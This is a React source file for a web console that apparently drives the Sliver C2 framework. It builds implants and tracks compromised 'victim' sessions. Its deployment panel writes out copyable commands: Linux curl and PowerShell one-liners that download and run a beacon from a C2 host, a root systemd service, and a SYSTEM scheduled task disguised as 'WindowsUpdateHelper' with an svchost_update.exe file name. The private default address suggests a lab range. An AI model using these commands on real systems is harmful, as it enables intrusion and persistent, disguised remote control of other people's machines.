import { useMemo, useState, useCallback } from 'react';
import {
  Title, Stack, Table, Text, TextInput, Badge, Group, Skeleton,
  Card, Collapse, Select, NumberInput, Button, Alert, Code, Divider,
  CopyButton, Tooltip, ActionIcon, SegmentedControl, Tabs,
} from '@mantine/core';
import {
  IconSearch, IconDownload, IconChevronDown, IconChevronUp,
  IconAlertCircle, IconCheck, IconInfoCircle, IconCopy, IconBrandWindows, IconBrandDebian,
} from '@tabler/icons-react';
import { useTranslation } from 'react-i18next';
import { useGetSessionsQuery, downloadImplant } from '@/store/api/sessionsApi';
import type { ImplantPlatform } from '@/types';

// ── Implant Builder ───────────────────────────────────────────────────────────

function CopyableCode({ value }: { value: string }) {
  return (
    <Group gap="xs" align="flex-start">
      <Code block style={{ flex: 1, fontSize: 11, whiteSpace: 'pre-wrap', wordBreak: 'break-all' }}>
        {value}
      </Code>
      <CopyButton value={value} timeout={1500}>
        {({ copied, copy }) => (
          <Tooltip label={copied ? 'Copied!' : 'Copy'} position="top">
            <ActionIcon
              variant={copied ? 'filled' : 'light'}
              color={copied ? 'green' : 'gray'}
              onClick={copy}
              mt={4}
              size="sm"
            >
              {copied ? <IconCheck size={14} /> : <IconCopy size={14} />}
            </ActionIcon>
          </Tooltip>
        )}
      </CopyButton>
    </Group>
  );
}

function ImplantBuilder() {
  const [open, setOpen] = useState(false);
  const [platform, setPlatform] = useState<ImplantPlatform>('linux');

  // Shared params
  const [c2, setC2] = useState('172.20.0.10');
  const [name, setName] = useState('');

  // Linux-only params
  const [arch, setArch] = useState<'amd64' | 'arm64'>('amd64');
  const [port, setPort] = useState<number>(80);

  const [loading, setLoading] = useState(false);
  const [downloaded, setDownloaded] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const effectiveName = name.trim() || (platform === 'linux' ? 'victim-linux' : 'VICTIM-WIN');

  // ── Deployment commands (mirrored from provision scripts) ─────────────────

  // Linux: curl → chmod → run (matches victim-linux.sh)
  const linuxCmd = [
    `curl -sf -o /usr/local/bin/sliver-implant \\`,
    `  "http://${c2}:8080/api/v1/implant/linux?name=${effectiveName}&c2=${c2}${arch !== 'amd64' ? `&arch=${arch}` : ''}" \\`,
    `  && chmod +x /usr/local/bin/sliver-implant \\`,
    `  && /usr/local/bin/sliver-implant &`,
  ].join('\n');

  // Linux: systemd service (persistent, matches what victim-linux.sh installs)
  const linuxSystemdCmd = [
    `# Download`,
    `curl -sf -o /usr/local/bin/sliver-implant \\`,
    `  "http://${c2}:8080/api/v1/implant/linux?name=${effectiveName}&c2=${c2}" \\`,
    `  && chmod +x /usr/local/bin/sliver-implant`,
    ``,
    `# Install as systemd service`,
    `cat > /etc/systemd/system/sliver-implant.service << 'EOF'`,
    `[Unit]`,
    `Description=Sliver Implant`,
    `After=network-online.target`,
    `[Service]`,
    `Type=simple`,
    `User=root`,
    `ExecStart=/usr/local/bin/sliver-implant`,
    `Restart=always`,
    `RestartSec=30`,
    `[Install]`,
    `WantedBy=multi-user.target`,
    `EOF`,
    `systemctl daemon-reload && systemctl enable --now sliver-implant`,
  ].join('\n');

  // Windows: download + scheduled task (matches victim-windows.ps1)
  const windowsScheduledTaskCmd = [
    `$ImplantPath = "C:\\Windows\\System32\\svchost_update.exe"`,
    `Invoke-WebRequest -Uri "http://${c2}:8080/api/v1/implant/windows?name=${effectiveName}&c2=${c2}" \``,
    `  -OutFile $ImplantPath -UseBasicParsing`,
    `$action    = New-ScheduledTaskAction -Execute $ImplantPath`,
    `$trigger   = New-ScheduledTaskTrigger -AtStartup`,
    `$settings  = New-ScheduledTaskSettingsSet -RestartCount 10 -RestartInterval (New-TimeSpan -Minutes 1)`,
    `$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest`,
    `Register-ScheduledTask -TaskName "WindowsUpdateHelper" \``,
    `  -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force`,
    `Start-ScheduledTask -TaskName "WindowsUpdateHelper"`,
  ].join('\n');

  // Windows: quick one-liner
  const windowsOneLiner =
    `$p="C:\\beacon.exe"; iwr "http://${c2}:8080/api/v1/implant/windows?name=${effectiveName}&c2=${c2}" -OutFile $p -UseBasicParsing; Start-Process $p`;

  // ── Download handler ──────────────────────────────────────────────────────

  const handleDownload = useCallback(async () => {
    setLoading(true);
    setError(null);
    setDownloaded(false);
    try {
      const blob = await downloadImplant({
        platform,
        c2,
        name: effectiveName,
        ...(platform === 'linux' ? { arch, port } : {}),
      });
      const url = URL.createObjectURL(blob);
      const anchor = document.createElement('a');
      anchor.href = url;
      anchor.download = platform === 'linux'
        ? `sliver-beacon-linux-${arch}`
        : 'sliver-beacon-windows.exe';
      anchor.click();
      URL.revokeObjectURL(url);
      setDownloaded(true);
    } catch (e) {
      setError(
        e instanceof Error
          ? e.message
          : 'Build failed. Check that the backend is running and Sliver gRPC is reachable.',
      );
    } finally {
      setLoading(false);
    }
  }, [platform, c2, name, arch, port, effectiveName]);

  const resetStatus = () => { setDownloaded(false); setError(null); };

  return (
    <Card withBorder p={0} radius="md">
      {/* ── Header / toggle ── */}
      <Group
        px="sm" py="xs"
        justify="space-between"
        style={{ cursor: 'pointer' }}
        onClick={() => setOpen((v) => !v)}
      >
        <Group gap="sm">
          <IconDownload size={18} />
          <Text fw={600} size="sm">Deploy Implant</Text>
          <Text size="xs" c="dimmed">Build a Sliver beacon and deliver it to a target</Text>
        </Group>
        {open ? <IconChevronUp size={16} /> : <IconChevronDown size={16} />}
      </Group>

      <Collapse in={open}>
        <Divider />
        <Stack gap="md" p="sm">

          {/* ── Platform selector ── */}
          <SegmentedControl
            value={platform}
            onChange={(v) => { setPlatform(v as ImplantPlatform); resetStatus(); }}
            data={[
              {
                value: 'linux',
                label: (
                  <Group gap={6} wrap="nowrap">
                    <IconBrandDebian size={14} />
                    <Text size="sm">Linux</Text>
                  </Group>
                ),
              },
              {
                value: 'windows',
                label: (
                  <Group gap={6} wrap="nowrap">
                    <IconBrandWindows size={14} />
                    <Text size="sm">Windows</Text>
                  </Group>
                ),
              },
            ]}
          />

          {/* ── Shared params ── */}
          <Group grow wrap="nowrap">
            <TextInput
              label="C2 Callback Host"
              description="IP the beacon calls back to (must be reachable from victim)"
              value={c2}
              onChange={(e) => { setC2(e.currentTarget.value); resetStatus(); }}
              placeholder="172.20.0.10"
            />
            <TextInput
              label="Implant Name"
              description="Identifies the beacon in Sliver (leave blank for default)"
              value={name}
              onChange={(e) => { setName(e.currentTarget.value); resetStatus(); }}
              placeholder={platform === 'linux' ? 'victim-linux' : 'VICTIM-WIN'}
            />
          </Group>

          {/* ── Linux-only params ── */}
          {platform === 'linux' && (
            <Group grow wrap="nowrap">
              <Select
                label="Architecture"
                data={[
                  { value: 'amd64', label: 'amd64 (x86-64)' },
                  { value: 'arm64', label: 'arm64 (AArch64)' },
                ]}
                value={arch}
                onChange={(v) => { setArch((v ?? 'amd64') as 'amd64' | 'arm64'); resetStatus(); }}
                allowDeselect={false}
              />
              <NumberInput
                label="Listener Port"
                description="Sliver HTTP listener port on C2"
                value={port}
                onChange={(v) => { setPort(Number(v) || 80); resetStatus(); }}
                min={1}
                max={65535}
              />
            </Group>
          )}

          {/* ── Download button ── */}
          <Group>
            <Button
              leftSection={<IconDownload size={16} />}
              onClick={handleDownload}
              loading={loading}
              color={platform === 'linux' ? 'teal' : 'blue'}
            >
              {loading
                ? 'Building beacon (~1-2 min)…'
                : `Build & Download ${platform === 'linux' ? 'ELF' : 'EXE'}`}
            </Button>
          </Group>

          {/* ── Status ── */}
          {loading && (
            <Alert icon={<IconInfoCircle size={16} />} color="blue" variant="light">
              <Text size="sm" fw={500}>
                First build compiles the beacon — this takes ~1–2 minutes.
              </Text>
              <Text size="xs" c="dimmed" mt={4}>
                Sliver starts an HTTP listener on <b>{c2}:{platform === 'linux' ? port : 80}</b>,
                then compiles the {platform === 'linux' ? 'ELF' : 'PE'} binary.
                Subsequent downloads are instant (cached in-process).
              </Text>
            </Alert>
          )}
          {error && (
            <Alert icon={<IconAlertCircle size={16} />} color="red" variant="light" title="Build failed">
              {error}
            </Alert>
          )}
          {downloaded && (
            <Alert icon={<IconCheck size={16} />} color="green" variant="light">
              {platform === 'linux'
                ? `Downloaded sliver-beacon-linux-${arch}. Copy to target and run it.`
                : 'Downloaded sliver-beacon-windows.exe. Copy to target and run it.'}
              {' '}The victim appears in the sessions table below after check-in.
            </Alert>
          )}

          {/* ── Deployment commands ── */}
          {platform === 'linux' ? (
            <Tabs defaultValue="oneliner">
              <Tabs.List>
                <Tabs.Tab value="oneliner">One-liner</Tabs.Tab>
                <Tabs.Tab value="systemd">Persistent (systemd)</Tabs.Tab>
              </Tabs.List>
              <Tabs.Panel value="oneliner" pt="xs">
                <Stack gap={4}>
                  <Text size="xs" c="dimmed">Run on the Linux target:</Text>
                  <CopyableCode value={linuxCmd} />
                </Stack>
              </Tabs.Panel>
              <Tabs.Panel value="systemd" pt="xs">
                <Stack gap={4}>
                  <Text size="xs" c="dimmed">Install as a persistent systemd service (survives reboots):</Text>
                  <CopyableCode value={linuxSystemdCmd} />
                </Stack>
              </Tabs.Panel>
            </Tabs>
          ) : (
            <Tabs defaultValue="scheduled">
              <Tabs.List>
                <Tabs.Tab value="oneliner">Quick one-liner</Tabs.Tab>
                <Tabs.Tab value="scheduled">Persistent (Scheduled Task)</Tabs.Tab>
              </Tabs.List>
              <Tabs.Panel value="oneliner" pt="xs">
                <Stack gap={4}>
                  <Text size="xs" c="dimmed">Run in PowerShell on the Windows target:</Text>
                  <CopyableCode value={windowsOneLiner} />
                </Stack>
              </Tabs.Panel>
              <Tabs.Panel value="scheduled" pt="xs">
                <Stack gap={4}>
                  <Text size="xs" c="dimmed">
                    Installs as SYSTEM scheduled task <b>WindowsUpdateHelper</b> (survives reboots, restarts on failure):
                  </Text>
                  <CopyableCode value={windowsScheduledTaskCmd} />
                </Stack>
              </Tabs.Panel>
            </Tabs>
          )}

          <Text size="xs" c="dimmed">
            Sessions auto-refresh every 5 s — victim appears in the table below after it checks in.
          </Text>
        </Stack>
      </Collapse>
    </Card>
  );
}

// ── Sessions page ─────────────────────────────────────────────────────────────

export default function SessionsListPage() {
  const { t } = useTranslation();
  const [search, setSearch] = useState('');

  const { data: sessions = [], isLoading } = useGetSessionsQuery(undefined, {
    pollingInterval: 5000,
    skipPollingIfUnfocused: true,
  });

  const filtered = useMemo(() => {
    if (!search.trim()) return sessions;
    const q = search.toLowerCase();
    return sessions.filter(
      (s) =>
        s.id.toLowerCase().includes(q) ||
        s.name.toLowerCase().includes(q) ||
        s.hostname.toLowerCase().includes(q) ||
        s.username.toLowerCase().includes(q) ||
        s.os.toLowerCase().includes(q) ||
        (s.remote_address ?? '').toLowerCase().includes(q),
    );
  }, [sessions, search]);

  return (
    <Stack gap="lg">
      <Group justify="space-between">
        <Group gap="sm">
          <Title order={2}>{t('nav.sessions')}</Title>
          <Badge color={sessions.length > 0 ? 'green' : 'gray'} variant="light" size="lg">
            {sessions.length} active
          </Badge>
        </Group>
      </Group>

      <ImplantBuilder />

      {sessions.length === 0 && !isLoading && (
        <Text c="dimmed" size="sm">
          No active Sliver sessions. Deploy an implant above, or make sure victim containers are
          running and have checked in. Sessions auto-refresh every 5 seconds.
        </Text>
      )}

      <TextInput
        placeholder={t('actions.search') + '…'}
        leftSection={<IconSearch size={16} />}
        value={search}
        onChange={(e) => setSearch(e.currentTarget.value)}
      />

      <Table.ScrollContainer minWidth={700}>
        <Table striped highlightOnHover aria-label="Active sessions">
          <Table.Thead>
            <Table.Tr>
              <Table.Th>Session ID</Table.Th>
              <Table.Th>Name</Table.Th>
              <Table.Th>Hostname</Table.Th>
              <Table.Th>IP</Table.Th>
              <Table.Th>OS / Arch</Table.Th>
              <Table.Th>Username</Table.Th>
              <Table.Th>PID</Table.Th>
            </Table.Tr>
          </Table.Thead>
          <Table.Tbody>
            {isLoading ? (
              Array.from({ length: 5 }).map((_, i) => (
                <Table.Tr key={i}>
                  {Array.from({ length: 7 }).map((_, j) => (
                    <Table.Td key={j}><Skeleton height={16} radius="sm" /></Table.Td>
                  ))}
                </Table.Tr>
              ))
            ) : filtered.length === 0 ? (
              <Table.Tr>
                <Table.Td colSpan={7} ta="center">
                  <Text c="dimmed" py="xl">{t('no_data')}</Text>
                </Table.Td>
              </Table.Tr>
            ) : (
              filtered.map((session) => (
                <Table.Tr key={session.id}>
                  <Table.Td>
                    <Text size="sm" ff="monospace" c="dimmed">{session.id.slice(0, 8)}</Text>
                  </Table.Td>
                  <Table.Td>
                    <Text size="sm" fw={600} c="cyan" ff="monospace">{session.name}</Text>
                  </Table.Td>
                  <Table.Td>
                    <Text size="sm">{session.hostname}</Text>
                  </Table.Td>
                  <Table.Td>
                    {session.remote_address ? (
                      <Text size="sm" ff="monospace">{session.remote_address}</Text>
                    ) : (
                      <Text size="sm" c="dimmed">—</Text>
                    )}
                  </Table.Td>
                  <Table.Td>
                    <Group gap={4}>
                      <Badge
                        variant="light"
                        size="sm"
                        color={session.os.toLowerCase().includes('windows') ? 'blue' : 'teal'}
                      >
                        {session.os}
                      </Badge>
                      {session.arch && (
                        <Badge variant="outline" size="xs" color="gray">{session.arch}</Badge>
                      )}
                    </Group>
                  </Table.Td>
                  <Table.Td>
                    <Text size="sm">{session.username}</Text>
                  </Table.Td>
                  <Table.Td>
                    <Text size="sm" ff="monospace">{session.pid}</Text>
                  </Table.Td>
                </Table.Tr>
              ))
            )}
          </Table.Tbody>
        </Table>
      </Table.ScrollContainer>
    </Stack>
  );
}
